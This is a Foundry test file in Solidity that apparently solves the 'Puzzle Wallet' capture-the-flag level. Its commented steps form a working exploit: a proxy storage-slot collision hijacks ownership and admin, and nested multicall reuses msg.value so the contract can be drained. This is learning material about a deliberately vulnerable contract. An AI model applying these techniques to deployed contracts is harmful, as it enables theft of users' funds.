// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import { PuzzleWallet, PuzzleProxy } from "./PuzzleWallet.sol";

contract PuzzleWalletTest is Test {
    PuzzleProxy proxy;
    PuzzleWallet wallet;
    PuzzleWallet instance;

    address deployer = vm.addr(87654);
    address h3x0r = vm.addr(1337);

    function setUp() public {
        vm.startPrank(deployer);
        deal(deployer, 1 ether);
        deal(h3x0r, 1 ether);

        wallet = new PuzzleWallet();
        bytes memory initData = abi.encodeWithSelector(
            PuzzleWallet.init.selector, 100 ether
        );
        proxy = new PuzzleProxy(deployer, address(wallet), initData);
        instance = PuzzleWallet(address(proxy));

        instance.addToWhitelist(deployer);
        instance.deposit{value: 1 ether}();

        vm.stopPrank();
    }

    function testPuzzleWalletHack() public {
        vm.startPrank(h3x0r);
        
        // 1. set ourselves as admin of instance
        // slot 0 proxy = slot 0 instance;
        proxy.proposeNewAdmin(h3x0r);
        assertEq(proxy.pendingAdmin(), h3x0r);
        assertEq(instance.owner(), h3x0r);

        // 2. whitelist ourselves
        instance.addToWhitelist(h3x0r);
        assertTrue(instance.whitelisted(h3x0r));

        // 3. drain balance of contract
        // 3.1 call deposit twice with msg.value 
        // so our 1 ether counts as 2
        bytes[] memory depositData = new bytes[](1);
        depositData[0] = abi.encodeWithSignature("deposit()");
        bytes[] memory multicallData = new bytes[](2);
        multicallData[0] = abi.encodeWithSignature("deposit()");
        multicallData[1] = abi.encodeWithSignature("multicall(bytes[])", depositData);
        instance.multicall{value: 1 ether}(multicallData);
        // 3.2 drain contract
        instance.execute(h3x0r, 2 ether, "");
        assertEq(h3x0r.balance, 2 ether);
        assertEq(address(instance).balance, 0);

        // 4. set setMaxBalance to our address casted as uint256
        // slot 1 proxy = slot 1 instance
        instance.setMaxBalance(uint256(uint160(h3x0r)));

        assertEq(proxy.admin(), h3x0r);
    }
}